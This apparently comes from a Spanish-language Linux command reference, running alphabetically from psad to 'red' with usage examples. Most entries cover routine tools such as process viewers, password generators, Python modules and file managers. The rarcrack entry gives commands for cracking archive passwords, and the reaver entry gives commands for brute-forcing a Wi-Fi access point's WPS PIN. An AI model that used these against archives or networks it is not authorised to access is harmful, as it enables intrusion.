# psad -S (Muestra el estado de cualquier proceso psad que pueda estar ejecutándose. La salida muestra una lista de los paquetes que psad ha procesado, junto con todas las direcciones IP y los niveles de peligro correspondientes que han escaneado la red)


psbook
[psutils]. Paginar un archivo ps para imprimir como libro. Ver ps2pdf.


psktool
[gnutls]. Programa que genera claves aleatorias para uso TLS-PSK. Las claves se almacenan en formato hexadecimal en un archivo de claves.
$ psktool -u USER (genera clave para el usuario mencionado y la guarda en /etc/passwd.psk)
$ psktool -u USER -p clave.psk (la guarda en el archivo clave.psk)


pslist
Examina la lista de los procesos y muestra el ID y los PIDs de los procesos hijos.
$ pslist (Muestra todo el listado)
$ pslist chromium (Mostrará sólo el de la aplicación especificada)
$ pslist 26995 (Mostrará sólo la del PID especificado)


pslog
Informar de la ruta de los registros de un proceso.
pslog PID (del pid mencionado)


ps_mem
Script de Python para conocer la memoria RAM que consume cada aplicación de nuestro equipo aunque tenga abiertos varios procesos. Descarga:
# wget https://raw.githubusercontent.com/pixelb/ps_mem/master/ps_mem.py
Tambien puede instalarse con pip caso de tenerlo instalado: # pip install ps_mem
# python ps-mem.py -S (De todos los programas que se estan ejecutando)
# python ps_mem.py -w 5 (Actualizando datos cada 5 segundos)
# python ps_mem.py -t (Mostrar el total de todos los procesos)
# python ps_mem.py -p 5123 (Mostrar el consumo del PID mencionado)


psmisc
Utilidades que utilizan el sistema de archivos proc. Incluye las aplicaciones: fuser [identifica procesos que están utilizando archivos o sockets.], killall [mata procesos por nombre], peekfd [muestra los datos que viajan sobre un descriptor de archivo], prtstat [imprime el contenido de /proc/<pid>/stat], pslog [Las utilidades que utilizan el sistema de archivos proc informan la ruta de los registros actuales de un proceso.], pstree y pstree.x11 [muestran los procesos en ejecución como un árbol].


psst
[Power Stress and Shaping Tool]. Herramienta que controla componentes Intel como CPU y GPU. Permite un control de la función de estrés sin su propia sobrecarga de proceso. Los logs en /var/log/psst.csv
# psst
# psst -v -d 10000 -s saw-tooth,5 -C a -p 500


pstotext
Lee uno o más archivos PostScript o PDF y escribe su representación en txt o en otro formato que se especifique.
$ pstotext archivo.pdf > salida.xml


pstree
Para ver el árbol de procesos
$ pstree -al   (verlo con cada uno de sus hilos de ejecución)


psutils
Colección de utilidades para manipular documentos PostScript. Se admite la selección y reorganización de páginas y la combinación de páginas para la impresión de varias páginas por cara. Incluye los siguientes programas: epsffit, extractres, fixdlsrps, fixfmps, fixmacps, fixpsditps, fixpspps, fixscribeps, fixtpps, fixwfwps, fixwpps, fixwwps, getafm, includeres, psbook, psmerge, psnup, psresize, psselect, pstops, showchar


ptop
Muestra una lista ordenada de procesos del sistema. Los procesos se ordenan con los usuarios con mayor cantidad de CPU en la parte superior. Es capaz de decodificar líneas de comando de Python, Ruby, Perl, Node, Java, bash, sh, zsh y mostrar lo que realmente se está ejecutando. Muestra una salida estable al contar el tiempo de CPU desde que se inició ptop. Proporciona un histograma de carga del sistema, tiempos de actividad y muestra la carga del sistema en relación con la cantidad de núcleos lógicos y físicos del sistema.
$ ptop


ptx
genera un índice permutado de los contenidos de un fichero, con cada palabra clave en su contexto.
$ ptx archivo.txt


pub2odg
Este paquete contiene una utilidad para convertir documentos de Publisher en documentos OpenDocument.
$ pub2odg archivo.pub archivo.odf (si se omite el archivo de salida se impreme en pantalla)


pulseaudio
Servidor de sonido multiplataforma.
$ pulseaudio -D  (Reiniciar el servicio)
1.-
Habilitar la salida de audio combinada a todos los dispositivos (analógicos y hdmi)
# nano /etc/pulse/default.pa
Y añadir la linea:
	load-module module-combine-sink sink_name=combined


pureline
Utilidad escrita en bash que muestra de una manera distinta el prompt de la shell.
Instalación:
Instalación de pureline
	$ git clone https://github.com/chris-marsh/pureline.git
	$ cp -r pureline ~/.pureline
	$ cd pureline/
	$ cp configs/powerline_full_256col.conf ~/.pureline.conf
	$ source ~/.pureline/pureline .pureline.conf
	$ souce ~/.bashrc
El archivo de configuración está en ~/.pureline.conf. El resultado se observa al abrir una nueva terminal


purge-old-kernels
[bikeshed] Herramienta que elimina kernels antiguos, tanto los paquetes linux-image como los linux-headers, dejando por defecto solo los dos últimos .
# purge-old-kernels (forma básica)
# purge-old-kernels --keep 4 (Mantendrá los 4 últimos kernels)


pushd
Moverse al directorio especificado, como con cd, pero el directorio anterior se guarda en una pila al que puede volverse.
[~]$ pushd /usr/share/apache2/icons (del dir personal entramos en icons)
[/usr/share/apache2/icons]$ pushd /var/www/ (de icons a www)
[/var/www]$ pushd /lib/init/rw/apache2 (de www a apache2)
[/lib/init/rw/apache2]$ popd (retrocedemos un directorio en la pila)
[/var/www]$ popd (retrocedemos otro directorio de la pila)
[/usr/share/apache2/icons]$ dirs (nos informa de la pila de directorios en cada momento)


pv
Visualizar el progreso de un proceso.
$ echo "Este texto se escribirá letra a letra hasta terminar con toda la frase" |  pv -qL 10 (Escribir un texto letra a letra)
$ cat /etc/apt/sources.list | pv -qL 10  (lo mismo de un archivo)
$ pv archivo1 > archivo2  (copiar archivo mostrando el progreso)
$ pv -tpreb /dev/urandom | dd of=file.img (ejemplo hacia un archivo)
$ pv /dev/urandom -L 3m > /dev/null (otro ejemplo del comportamiento de pv)


pvdisplay
Mostrar características de un volúmen físico.
# pvdisplay /dev/sda2
# pvdisplay -s /dev/sda2 (conocer el espacio disponible en dicho un volúmen físico)


pvesh
ssh restrictivo propio de proxmox.
$ pvesh get /nodes/virtual1/qemu (Obtener un listado de todas las máquinas virtuales)
$ pvesh create /nodes/virtual1/qemu/100/status/start (Arrancar la VM con id 100)
$ pvesh get /nodes/virtual1/qemu/100/config (Obtener toda la configuración de la VM con id 100)
$ pvesh delete /nodes/virtual1/qemu/100 (Borrar la máquina virtual con id 100)
$ pvesh get /nodes/virtual1/storage (Obtener la información de los _Storages_)
$ pvesh create /access/users -userid usuario@pve (Crear usuario)
$ pvesh delete /access/users/usuario@pve (Eliminar usuario)


pwck
Verifica la integridad de los archivos de claves [/etc/passwd y /etc/shadow].
# pwck (Salida vacia significa todo correcto)
# pwck /etc/passwd


pwconv
Hace visible el archivo /etc/shadow que previamente se había hecho invisible con el comando pwunconv.
# pwconv


pwd
Mostrar el directorio actual.


pwdx
Informa del directorio actual de uno o varios procesos.
$ pwdx pid pid pid


pwgen
Genera claves aleatoriamente.
$ pwgen  (Las más simples)
$ pwgen -Bcnsy
$ pwgen -Bsy 10 1 (generar un pasword de 10 cifras con caracteres raros)
$ pwgen -Bcs 10 4 (crear 4 contraseñas de 10 caracteres)
opciones:
	-B     (ambiguas)
	-c     (con mayusculas, por defecto)
	-n     (con números)
	-y     (con símbolos)
	-s     (totalmente aleatoria)


pwman3
Interfaz para la gestión de contraseñas. Le permite almacenar su contraseña en una base de datos sqlite bloqueada por una contraseña maestra.
Algunas opciones a modificar o incorporar en el archivo de configuración:
# nano ~/.config/pwman3/config
  [Global]
  cls_timeout = 0 # (Sin borrar la pantalla. Con un número, por ejemplo 10, se borrará a los 10 segundos)
  xsel = yes
  [Generator]
  numerics = true # (crear una contraseña a partir del carácter numérico y el carácter alfabético [A-Za-z0-9])
  special_signs = true # (aceptar signos especiales tipo: "@", "#", "?", "!", '\\', "|", "$", "%", "^", "&" ...)
  default_pw_length = 40 # (longitud de la contraseña)
# pwman3 (lanzar la aplicación y entrar en el prompt)
pwman3> h (muestra las opciones disponibles)
pwman3> tags (enumera todas las etiqueta)
pwman3> l tags (los usuario englobados en la etiqueta)
pwman3> n (entrar nuevo usuario, contraseña, url y tag)
pwman3> p 2 (mostrar los datos del número 2 del listado)
pwman3> exit (salir)


pwscore
[libpwquality-tools]. Herramienta para verificar la calidad de una contraseña.
$ pwscore (pulsar intro y entrar la contraseña. El valor va de 0 a 100. Superior a 50 se considera fuerte.)
Nota.- Los mensajes de error pueden ser el tipo: "La contraseña és inferior a 8 caracteres" o si es muy simple "La contraseña no pasa la comprovación del diccionario"


pwunconv
Hace invisible el archivo /etc/shadow que previamente se había hecho visible con el comando pwconv.
# pwunconv


pydf
Muestra información sobre todos los sistemas de archivos montados de forma coloreada.
$ pydf -a (Incluye los sistemas que contengan 0 bloques)
$ pydf -h (las particiones montadas y su ocupación)
$ pydf -i (información por inodos en lugar de bloques)


pydoc
Documentación de python.
$ pydoc -p 13000 (Abrir la documentacion de python en el puerto 13000 para su acceso via navegador)
$ pydoc dbhash (información sobre el comando dbhash de python)
$ pydoc -w sha (crea el archivo sha.html para abrirlo con el navegador y modstrar la información sobre el módulo)


pygtail
Herramienta para leer archivos de registro capaz de manejar archivos de registro que rotan.
# pygtail /var/log/syslog


pyhtmlizer
Generar un documento HTML con las fuentes de un archivo en Python. Para colorear se ha de proporcionar una hoja de estilo.
$ pyhtmlizer archivo.py (Crea un html archivo.py.html que se ùede visualizar en el navegador)
$ pyhtmlizer -s URL archivo.py (la URL ha de ser el css para colorear la salida de archivo.py.html)


py-pcuinfo
Obtener información de la CPU sin necesidad de dependencias o programas adicionales.
$ py-pcuinfo


pyphoon
[python-dateutils] Muestra en ascii las fases de la luna. descarga: <https://github.com/chubin/pyphoon> . Acepta varios formatos de fecha (2017-02-01, 01/02/2017...)
$ pyphoon (En el dia de hoy y con 30 lineas [por defecto])
$ pyphoon -n 40 04-02-2917 (con 40 lineas y especificando la fecha)


pyradio
[mplayer python-pip] Emisoras de radio por consola.Descarga, descomprimir e instalar:
	$ wget https://github.com/coderholic/pyradio/archive/master.zip
	$ unzip master.zip
	$ cd pyradio-master
	# pip install pyradio
$ pyradio -l (Ver listado de emisoras)
Añadir una emisora:
	# pyradio -a
	Enter the name: "Música Classica Uruguay"
	Enter the url: "http://radio.sodreuruguay.com:9090/listen.pls"
$ pyradio (Arrancar la aplicación)


pyroom
Editor minimalista.
Atajos:
	Ctrl + h (Muestra la ayuda)
	Ctrl + i (Información del búfer)
	Ctrl + p (Abre preferencias)
	Ctrl + n (Crear nuevo buffer)
	Ctrl + o (Abrir archivo)
	Ctrl + q (salir)
	Ctrl + s (Guardar)
	Ctrl + shift + s (Guardar búfer como...)
	Ctrl + w (Cerrar búfer y salir si era el último búfer)
	Ctrl + y (Rehacer la última modificación)
	Ctrl + z (Deshacer la última modificación)
	Ctrl + RePág (Cambia al buffer anterior)
	Ctrl + AvPág (Cambia al siguiente búfer)


python
Lenguaje de programación
$ python (abre la shell de python para introducir comandos)
$ python -c 'print "x"*50'  (escribe una linea xxxxx de 50 caracteres)
$ python -m SimpleHTTPServer (Abre un servidor web en la carpeta actual. Para visualizarla desde un ordenador de la red local en el navegador con  http://ip:8000)
$ python -c "import SimpleHTTPServer;SimpleHTTPServer.test()"  (lo mismo pero incluyendo los subdirectorios). Cancelar los procesos con Ctrol+c
$ python3 -m http.server (Otra forma de crear un servidor en el propio directorio)
$ python -m SimpleHTTPServer 8080 (crea un servidor por el puesto especificado)
$ python -m smtpd -n -c DebuggingServer localhost:25 (Iniciar un servidor de correos en el puerto especificado)
$ python -m pyftpdlib.ftpserver (inicia servidor ftp)
$ python -m webbrowser http://web.com (Abre una página en el navegador)
$ python -m urllib http://web.com (Obtener código fuente de una página)
$ python -m htmllib test.html (Eliminar etiquetas html de un archivo html)
$ python -m filecmp dir1 dir2 (Comparar dos directorios)
$ python -m calendar (Mostrar calendario)
$ python -m calendar 2013 07 (Mostrar un mes concreto de un año)
$ python -c "help('modules')" (Muestra los módulos instalados)
$ python -m platform (Como uname -a)
$ echo "Linux es un sistema genial" | python -m encodings.rot_13 (Codificar simple en ROT_13 [rotar 13 veces])
$ echo "Yvahk rf ha fvfgrzn travny" | python -m encodings.rot_13 (Descodificar en ROT_13)
$ echo "Linux es un sistema genial" | python -m base64 -e (Codificar en base64)
$ echo "TGludXggZXMgdW4gc2lzdGVtYSBnZW5pYWwK" | python -m base64 -d (Descodificar en base64)


python-hachoir-metadata
Herramientas para extraer metadatos de imagenes. Soporta 32 formatos distintos de archivos.
$ hachoir-metadata imagen


pyversions
Muestra infromación sobre las versiones de python instaladas en el sistema.
$ pyversions -d (muestra la por defecto)
$ pyversions -s (las soportadas)
$ pyversions -i (las instaladas)


px
analiza las líneas de comando de Python, Ruby, Node, Perl, Java, bash, zh, sh y le muestra lo que realmente se está ejecutando. px puede filtrar procesos por propietario ("px root"), buscar procesos por línea de comando y enumerar los procesos en un orden útil.
$ px user
$ px root
$ px --debug firefox


qcp
[renameutils]. Funciona como qmv [ver], pero copia los archivos en lugar de renombrarlos. Mantendrá tanto los archivos originales como los duplicados.
$ qcp dir


qemu-nbd
Utilidad de Qemu para poder montar discos virtuales. Crea un disco de red. Es necesario cargar el módulo nbd (modprobe nbd)
# qemu-nbd -c /dev/nbd0 fichero.vdi (Crear dispositivo de disco de red a partir del fichero vdi de VirtualBox. Ahora hay que montar la partición con mount /dev/nbd0p1 /mnt)


qiv
Visor de imágenes muy pequeño y bastante rápido. Las características incluyen zoom, maxpect, reducción de escala, pantalla completa, corrección de brillo/contraste/gamma, presentación de diapositivas, desplazamiento con teclado y mouse, rotar hacia la izquierda/derecha, voltear, eliminar (mover a .qiv-trash/), saltar imagenes...
% qiv imagen.png


qmv
[renameutils]. Abrirá los nombres de los archivos en un directorio con el editor de texto predeterminado y permitirá editarlos.
$ qmv dir (renombrar los nombres de los archivos del directorio)
$ qmv -f do dir (mostrar sólo la columna del archivo de destino [f], 'do' se refiere al destino y el directorio)


qpdf
Programa para analizar y modificar la estructura de los archivos PDF.
$ qpdf --decrypt protegido.pdf salida.pdf (eliminar toda la información relativa al cifrado)
$ qpdf --show-encryption test.pdf (Ver el tipo de seguridad y cifrado utilizado)
$ qpdf --empty --pages entrada.pdf 1-5 -- salida.pdf (Extraer las primeras cinco hojas de un documento)
$ qpdf --empty --pages entrada.pdf z-1 -- salida.pdf (Reordenar las páginas de un documento en orden inverso)
$ qpdf --empty --pages doc1.pdf 1-z doc2.pdf 1-6 -- salida.pdf (Unir todo un documento con las 6 primeras páginas de otro)
$ qpdf --optimize-images entrada.pdf salida.pdf (optimiza las imágenes del PDF para optimizar el tamaño del archivo. Útil para documentos escaneados con xsane u otros programas)


qrencode
Codifica datos de entrada en código QR y los guarda en una imatgen png.
$ qrencode -o salida.png 'linux es genial' (código QR de un texto)
$ qrencode -r clave.pub -o clave.pub.png (código QR de un archivo que contiene una clave publica)


qterminal
Emulador de terminal con división de terminales horizontal y verticalmente, múltiples pestañas, colores...
$ qterminal -w /home/USER/Documentos (abrir la terminal con el directorio especificado)
$ qterminal -d (iniciar en "modo desplegable" tipo yakuake o tilda)
Nota.- Si se tiene alguna de estas dos terminales desplegables y se quiere compaginar con qterminal ha de modificarse el lanzamiento de F12 por otro en las preferencias.


quiterss
Lector de noticias.
Algunos atajos:
+ (Suguiente noticia sin leer)
- (Anterior noticia sin leer)
Ctrl+r (Marcar canal como leído)
Ctrl+R (Marcar todos los canales como leídos)
Ctrl+Flechas arriba/abajo (Subir/bajar canal)
Flechas derecha/izquierda (Subir/bajar noticias)
espacio (Abrir en una pestaña)
Ctrl+o (Abrir en el navegador externo)
Ctrl+w (Cerrar pestaña)
F5 (Actualizar canal)
Ctrl+F5 (Actualizar todos los canales)
F8 (Abrir opciones)
Ctrl+q (Salir)


quiz
Pruebas de conocimiento al azar [en inglés]
$ quiz (Listara los temas posibles)
$ quiz Europe capital (Preguntará capitales de Europa. Si no se sabe la respuesta pulsar intro en blanco y mostrará la respuesta)


quota
[quotatool]. Limitar el uso del espacio de disco para cada usuario de un servidor. El proceso es como sigue:
# nano /etc/fstab
Modificar la linea parecida a:
	/dev/hdb2    /home    ext2    errors=remount-ro   0    1
añadiendo usrquota y grpquota com sigue:
	/dev/hdb2    /home    ext2    errors=remount-ro,usrquota,grpquota  0    1
Reiniciar el servidor.
# quotacheck -avug (La primera vez muestra advertencia, prescindir de ellas)
# quotaon /home (Activar las cuotas)
# edquota USER1 (activar cuotas para un usuario)
# edquota -p USER1 USER2 (Otorgar a USER2 la misma cuota que USER1)
# quota USER2 (Comprobar si un usuario tiene cuota)


quotacheck
[quota quotatool]. Cuando una máquina la usan varios usuarios o grupos y queremos controlar el espacio usado por cada uno de ellos, tenemos la opción de activar el sistema de quotas a nivel de sistema de ficheros de modo que podamos personalizar por usuario y grupo el espacio máximo o número de inodos que pueden utilizar.
# quotacheck -c -u usuario (comprobar si un usuario tiene quotas)
# quotacheck -cgumv / (mirar qi existen quotas en la raiz)
Los parámetros son:
    -c  (Escaneo del sistema de ficheros en busca de quotas)
    -g  (Busca quotas de grupos)
    -u  (Busca quotas de usuarios)
    -m  (No intenta hacer un remount en sistemas read-only)
    -v  (Verbose)


radeontop
Utilidad para ver el uso de GPU detallado por componentes y el uso de VRAM de targetas gráficas ATi/AMD Radeon a partir de R600
$ radeontop


rain
[bsdgames]. Muestra chapoteo de agua en la terminal.
$ rain -d 120 (El máximo de lento. Por defecto 0 [rápido])


rails
Proporciona estructuras estándar para bases de datos, servidores web y sitios web. Precisa varias dependencias rvm, rbenv, postgress, algunos paquetes ruby...
$ rails new ~/weblog
$ cd weblog
$ rails s -b localhost -p 3000
$ firefox localhost:3000 (para ver eñ resultado)


ramfs
Permite asignar parte de la memoria física para ser utilizada como una partición lo que permite una vez montada, leer o escribir archivos de la RAM como si de una partición de disco se tratara. Dado que se está escribiendo en la memoria RAM del sistema, esta se borra en un reinicio o en un cuelgue. Relacionado con tmpfs [ver], se diferencia de este en que ramfs no usa swap y que si se supera la RAM del sistema, se bloquea. El proceso:
# mkdir /media/ram
# mount -t ramfs -o size=20m ramfs /media/ram
Comprobar con df -k [ver] o mount [ver]su correcto montaje


randmac
imprime una dirección MAC aleatoria para interfaces de máquinas virtuales.
$ randmac -l -e (local y con dirección EUI64)
$ randmac -g -u (global y para unicast)
$ randmac -U -m (para multidifusión y dígitos hexadecimales en mayúsculas)


random
Función interna de Bash que devuelve un número entero pseudoaleatorio en el rango: 0 - 32767. Para establecer un límite superior se utiliza la función módulo [%] y para un número inferior se le suma el propio número inferior.
$ echo $RANDOM (Cualquier número aleatorio dentro del rango)
$ echo $((RANDOM%20)) (Obtener un número de 0 a 20)
$ echo $((5+RANDOM%15)) (Obtener un número de 5 a 15)
$ VARIABLE=`echo $(($RANDOM))`


randtype
Utilidad para leer un archivo y mostrar la salida carácter por carácter o línea por línea a intervalos aleatorios.
$ randtype archivo (forma básica con valores por defecto)
$ randtype -t 10,100000 archivo (Retarda la salida de forma aleatoria entre 10 y 100000 microsegundos)
$ echo "Linux es un sistema genial" | randtype -m 4 (Simulando 4 errores en el tecleo de la frase)


ranger
[caca-utils highlight atool w3m poppler-utils mediainfo]. Navegador de archivos estilo vim [ver]. Preferible lanzarlo sobre xterm o urxvt. Algunos temas en < http://dotshare.it/category/fms/ranger/> . El directorio de temas está en /usr/lib/python2.6/dist-packages/ranger/colorschemes [puede ser tambien python2.7] y los nuevos temas pueden colocarse en .config/ranger/colorschemes/ [Si no existe se crea] .Antes de la primera configuración lanzar:
$ ranger (Creará los archivos necesarios en .config/ranger)
$ ranger --copy-config=all (Copiar configuración básica en el directorio creado)
Los ajustes en:
$ nano .config/ranger/options.py
Nota.- En algunas versiones en .config/ranger/rc.conf
Para modificar el tema:
	colorscheme = 'jungle'
Para bordes en los campos:
	draw_borders = True
Algunos atajos:
	gg (Ir al principio del directorio)
	G (Ir al final del directorio)
	s (Arranca una shell en el directorio actual)
    s -w comando (mostrará la salida de "comando y no cerrará la shell hasta pulsar intro)
    s -r comando (Pedirá la contraseña para ejecutar "comando")
	yy [F5] (copiar selección)
	dd [F6] (Cortar selección)
	pp (Pegar selección)
	ma (crea un marcador del presente directorio con el nombre "a")
	'a (Ir al directorio con marcador "a")
	uv (Suprimir todas las marcas de archivos)
	m (abre marcadores)
	Espacio (marcar archivo desplazándolo un espacio en el listado)
	gn (Abrir nueva pestaña. El número de pestañas se muestra en la parte superior derecha)
	gt [TAB] (Cambiar de pestaña)
	gc (Cerrar una pestaña)
	:delete (borrar un archivo)
	:rename (renombrar un archivo)
	r (Abre el archivo con una aplicacion a elegir)
	Ctrl+H (Mostrar/ocultar archivos ocultos)
	/ (buscar archivo en el presente directorio)
	? [F1] (Ver la pagina man)
	1? (Listado de atajos de teclado)
	2? (Comandos de ayuda)
	3? (Herramientas de ayuda)
	F3 (Mostrar archivo.Nueva pulsación de F3 salir)
	F4 (Editar archivo)
	F7 (Crear directorio)
	F8 Suprimir selección de archivos
	R (Actualizar directorio)
	! (Entrar comandos de shell)
	Ctrl+z (Salir a la shell. "fg" para volver a ranger)
	Q [F10](salir)


rankmirrors
Optimiza los mirrors de pacman.
# cp mirrorlist mirrorlist.backup
# rankmirrors mirrorlist.backup >> mirrorlist


ranlib
Genera un índice del contenido de un archivo y lo almacena en el archivo. El programa ranlib es otra forma de GNU ar [ver]; ejecutar ranlib es completamente equivalente a ejecutar ar -s.


rar
Empaqueta y comprime
$ rar a archivo.rar fichero1 fichero2  (Comprimir varios ficheros)
$ rar x archivo.rar  (Descomprimir)
$ rar v archivo.rar (Ver contenido)
$ rar a archivo.rar fichero -hp   (empaquetar un fichero con contraseña)
$ rar a archivo.rar file1 file2 dir1 (comprimir varios ficheros y directorios simultáneamente)


rarcrak
Crequear archivos encriptados y descifrador de contraseñas para archivos rar, zip y 7z.
$ rarcrack --type zip file.zip ()
$ rarcrack --threads 6 file.rar (utilizar 6 subprocesos)


rarp
Manipula la tabla rarp del nucleo.
$ rarp -a (Lista las entradas de la caché si el nucleo tiene soporte rarp)
$ rarp -d hostname (Elimina una entrada de la caché)


raspi-config
Acceso a los parámetros de configuración de la placa RaspberriPi


ratpoison
Es un administrador de ventanas simple, sin gráficos sofisticados, sin decoraciones en las ventanas y sin dependencia de mouse. Está inspirado en gran medida en GNU Screen. La pantalla se puede dividir en cuadros que no se superpongan. Todas las ventanas se mantienen maximizadas dentro de sus marcos para aprovechar al máximo el valioso espacio de su pantalla. Toda la interacción con el administrador de ventanas se realiza mediante pulsaciones de teclas. ratpoison tiene un mapa de prefijos para minimizar la manipulación de teclas.
# startx $(which ratpoison) (arrancar el administrador de ventanas)
Teclas útiles
C-t . (menú)
C-t ? (ayuda)
C-t c (abrir una terminal)
C-t a (visualización de la fecha)
C-t w (listar todas las ventanas)
C-t A (establece título de la ventana)
C-t k (mata la ventana actual)
C-t ! (ejecutar un comando de shell)
C-t ' (seleccionar ventana por número o el comienzo de su nombre sin distingue entre mayúsculas y minúsculas)
C-t 1 (ir a la ventana número 1. Lo mismo para con los números de 2 al 9)
C-t s (dividir marco horizontalmente)
C-t S (dividir marco verticalmente)
C-t Tab (cambia el foco a la siguiente ventana en el marco)
C-t Q (hacer que la ventana enfocada actual sea la única en el marco)
C-t r (cambiar tamaño del marco usando las teclas del cursor y enter)
C-t R (eliminar la ventana actual del marco)
C-t f (seleccionar una ventana en el marco actual usando números)
C-t u (deshacer un comando anterior)
C-t U (rehacer el comando deshecho)
C-t x (intercambiar la ventana actual con una seleccionada por otra en el cuadro actual)
C-t F (muestra la ventana actual)
C-t C-t (va al último frame)
C-t : comando (ejecutar un comando que tambien puede agregarse al archivo ~/.ratpoisonrc)
C-t b (destierra el mouse a una esquina de la pantalla)
C-t F9 (salir de ratpoison)
Los comandos ratpoison con C-t :
1. set (muestra toda la configuración)
2. bind (asocia una tecla a un comando. Si la tecla ya está ocupada , primero se ha de ejecutar el comando unbind)
3. bargravity ne (hace que la ventana barra se muestre en la esquina superior derecha. Otros valores: nw, se, sw)
4. tmpwm (permite lanzar un gestor de ventanas temporal. P.ej: para ejecutar la aplicación gimp)
5. number (cambia el número de la ventana)
6. select (selecciona una ventana mediante su número o el comienzo de su nombre. No distingue entre mayúsculas y minúsculas)
7. exec (ejecuta un programa en un proceso diferente)
8. msgwait (número de segundos que se muestra la salida de un comando en la pantalla)


rbash
shell restringido. Se usa para imponer a un usuario un entorno severamente limitado en el que, por ejemplo, no podrá cambiar de directorio [cd], especificar nombre que contengan la /, redirigir la salida usando operadores de redirección [>, <, >>], reemplazar la shell, desactivar el modo restringido, etc. Equivalente a "bash -c"
# adduser -s /bin/rbash juan (Crear un usuario con shell restringido)
# usermod -s /bin/rbash juan (Modificar la shell de un usuario ya establecido)
Si queremos ampliar la cantidad de comandos a disposición de un usuario limitado editamos de su directorio personal el archivo .bash_profile:
# nano .bash_profile
Y añadimos o modificamos las siguientes lineas:
    PATH=$HOME/apps
    export PATH
Creamos el directorio
# mkdir /home/juan/apps
Y añadimos enlaces de los binarios que queramos permitir al usuario [en este caso ls, cp y cat]
# ln -s /bin/ls /home/juan/apps/
# ln -s /bin/cp /home/juan/apps/
# ln -s /bin/cat /home/juan/apps/
Y bloqueamos el archivo:
# chattr +i /home/juan/.bash_profile


rbenv
Permite cambiar entre múltiples versiones de Ruby. Entrar en .bashrc la linea:
        eval "$(~/.rbenv/bin/rbenv init - bash)"
$ rbenv init
$ rbenv commands (listar todos los comandos disponibles)


rcconf
Parar/arrancar procesos durante el inicio
$ rcconf -now


rc.d
Inicia o para servicios en Arch Linux
# rc.d start servicio (inicia el demonio o servicio)
# rc.d restart servicio (Reinicia el demonio)
# rc.d stop servicio (Para el servicio)


rdesktop
Conexión a escritorio remoto.
$ rdesktop -k es -g 1024×768 -u USER -p PASS -a 15 -T tux -D client (Especificando teclado español [k], medidas de la ventana [g], usuario [u] y contraseña [p], especificar un mobre para la ventana [T] y suprimiendo la decoración de la ventana [D])


rdfind
programa para buscar archivos duplicados y, opcionalmente, enumerarlos, eliminarlos o reemplazarlos con enlaces simbólicos o físicos.  Si se encuentran dos (o más) archivos iguales, el programa decide cuál de ellos es el original y el resto se consideran duplicados.  De forma predeterminada, no se realiza ninguna acción aparte de crear un archivo con los archivos detectados
$ rdfind -deleteduplicates true ~/Documents (eliminar duplicacdos del directorio especificado)
$ rdfind /home/USER /home/USER/Documents


rdiff-backup
Backups incrementales locales o remotos. La aplicación ha de estar instalada en el cliente y en el servidor.
$ rdiff-backup --force 192.168.1.20::/home/USER/dir_remoto /home/USER/dir_local (Realiza un backup del dir_remota de la máquina 20 de la red y lo guarda en nuestro dir_local sin comprimir)
$ rdiff-backup /home/USER /media/datos/Backups/home_user.backup (Un backup de un directorio personal)


read
Espera una entrada por teclado y le asigna una variable, aunque contenga espacios.
	$ read -p "dime tu nombre " NOMBRE
	$ echo $NOMBRE
La opción "p" tambien permite entrar varias variables simultaneamente:
	$ read -p "entra 3 nombres" PRIMERO SEGUNDO TERCERO
	$ echo "Hola $PRIMERO $SEGUNDO $TERCERO"
La opción -a permite leer las palabras como elementos de un array:
	$ read -a frase
	Hola que tal
	$ declare -p frase
	declare -a frase='([0]="Hola" [1]="que" [2]="tal")'
$ read -s -p "entra la contraseña: " CONTRASEÑA (Para que no se vea en la pantalla lo que se escribe aunque si se efectua un echo $CONTRASEÑA se mostrará)
Algunas opciones:
-d (permite indicar un delimitador de fin de línea de forma que la línea se lee hasta encontrar este delimitador)
-e (permite que se puedan usar todas las combinaciones de teclas de readline)
-t 3 (Especificar un tiempo de espera en la entrada de datos antes de volver al prompt)
-n 1 (Efectuará la acción al pulsar una tecla sin necesidad de pulsar "Intro")


readlink
Muestra donde apunta un enlace simbólico.
$ readlink enlace
$ readlink -f enlace (Muestra el path absoluto)


readonly
Permite declarar variables de solo lectura [No modificables].
$ readonly -p (Las muestra todas)
$ readonly -f var (Crear la funcion "var" de solo lectura)
$ readonly -r var (Quita el atributo de "solo lectura" pero no permite redefinirla)


readpst
Herramienta para convertir base de datos de Outlook en PST a eml para su posterior exportación a Thunderbird
$ readpst -o  -r miarchivo.pst
$ readpst -M -b -e -o carpeta-destino miarchivo.pst (Generará los archivos EML en la carpeta-destino)


realpath
Muestra el path real de un enlace, un fichero o un directorio.
$ realpath -P Musica (si es un enlace)
$ realpath -e archivo (de un archivo)


reaver
Herramienta que lleva a cabo un ataque de fuerza bruta contra el número pin de la configuración protegida de un punto de acceso wifi. Precisa poner nuestra targeta en modo monitor (airmon-ng start wlan0)
# reaver -i mon0 -b 00:01:02:03:04:05 (Mínimo requerido, especificar nombre de la interfaz y BBSID)
Algunas opciones:
	--fixed (Fijando canal de la interfaz)
	-t 2 (Tiempo de espera de la recepción de paquetes. Por defecto 5)
	-d 0 (Desactivar tiempo de espera entre pins. Por defecto 1 segundo)
	-vv (Incrementar el nivel de detalle)


reboot
Reiniciar el sistema.
$ reboot -f (Fonzandolo)


recap
Vuelca información periódica sobre la ejecución de aplicaciones y el uso de recursos. Se almacena en el archivo /var/log/recap/recap.log. Los valores para los que se generan los informes y cuántos informes se almacenan se pueden especificar en /etc/recap.conf.


recaplog
[recap]. Maneja los registros generados por recap, comprimiendo y/o borrando los archivos de registro de /var/log/recap/recap.log
# recaplog -n


recaptool
[recap]. Analiza los registros e imprime información específica sobre la memoria, los procesos, las conexiones de red o las consultas a una base de datos mysql.
# recaptool -b ssh (la memoria del servicio ssh)
# recaptool -e 80 (del puerto 80)
# recaptool -q (de la base de datos mysql)
# recaptool -m http -e 80 -q (del servicio html del puerto 80 y la base de datos mysql)


recode
Convierte archivos a distintos formatos de caracteres
$ recode -l | less	(listado de conversiones disponibles)
$ recode iso8859-15..utf8 file.txt (cambiar caracteres iso... a utf.. de file.txt
$ recode iso8859-15../b64 file.txt (de caracteres iso.. a codificacion base64)
$ recode -lf iso8859-15 | grep euro  (buscar tabla de caracteres)
$ cat file.txt | recode ISO_8859-1..UTF8 > nuevo.txt (De iso8859-1 a utf-8 )
$ recode ..HTML < file.txt > file.html  (pasar un texto a html)


recordmydesktop
Grabar el escritorio.
$ recordmydesktop -o video.ogv (Especificando nombre del archivo de salida. Si no consta por defecto es out.ogv)
$ recordmydesktop --no-cursor (Sin grabar el cursor)
$ recordmydesktop --follow-mouse (La brabación sigue al cursor)
$ recordmydesktop --device pulse (Especificando dispositivo de sonido)


red
1.- Configurar IP fija
